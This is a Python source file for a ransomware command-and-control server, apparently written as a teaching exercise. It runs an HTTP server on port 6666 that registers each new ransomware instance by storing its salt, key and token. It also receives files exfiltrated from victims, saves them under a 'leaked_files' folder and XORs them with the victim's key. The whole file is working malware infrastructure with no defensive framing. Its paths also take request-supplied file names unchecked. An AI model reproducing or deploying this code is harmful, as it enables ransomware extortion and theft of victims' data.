import base64
from http.server import HTTPServer
from pathlib import Path
import logging
import sys
from xorcrypt import xorfile
from cncbase import CNCBase
import base64

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 fields

        # data is decoded from base64 to binary
        bin_data = base64.b64decode(data)
        # creation of path to save data to filename 
        file_path = f"{CNC.ROOT_PATH}/{token}/{filename}"
        # path = os.path.join(CNC.ROOT_PATH, token, filename)

        # the file created at file_path is opened as data_file
        with open(file_path, "wb") as data_file:
            # bin_data is written into data_file
            data_file.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict) -> dict:
        # used to register new ransomware instance
        # debug logging of all function parameters
        self._log.debug(path)
        self._log.debug(params)
        self._log.debug(body)
        # local handling of function parameters/data
        # The directory label is passed as a url parameter (hash of the token)
        label = params['label']
        # salt, key and token are retrieved from the body and saved locally
        salt = body['salt']
        key = body['key']
        token = body['token']

        # forging the new file path at /root/CNC/{token_hashed_as_hex}
        new_path = f"{CNC.ROOT_PATH}/{label}"

        # if Path(new_path).exists():
        #     raise FileExistsError

        # creating the new directory using an equivalent of `mkdir -p` (error if the folder already exists)
        Path(new_path).mkdir(parents=True, exist_ok=False)
        # writing data to separate files
        self.save_b64(label, salt, 'salt.bin')
        self.save_b64(label, key, 'key.bin')
        self.save_b64(label, token, 'token.bin')

        return {"status":"OK"}

    def post_file(self, path: str, params: dict, body: dict) -> dict:
        self._log.debug(path)
        self._log.debug(params)
        self._log.debug(body)

        label = params['label']
        file_name = body['file_name']
        file_data = body['file_data']
        file_data = base64.b64decode(file_data)

        key_path = f"{CNC.ROOT_PATH}/{label}/key.bin"
        new_path = f"{CNC.ROOT_PATH}/{label}/leaked_files"
        file_path = f"{new_path}/{file_name}"
        
        if not Path(new_path).exists():
            Path(new_path).mkdir(parents=True, exist_ok=False)

        with open(key_path, 'rb') as key_file:
            key = key_file.read()
            self._log.debug(key)

        # file_path = f"{new_path}/{file_name}.bin"
        with open(file_path, "wb") as data_file:
            # bin_data is written into data_file
            data_file.write(file_data)

        xorfile(file_path, key)

        return {"status":"OK"}

if __name__ == "__main__":
    if "--verbose" in sys.argv:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    # runnning the CNC server forever at 0.0.0.0:6666
    httpd = HTTPServer(('0.0.0.0', 6666), CNC)
    httpd.serve_forever()
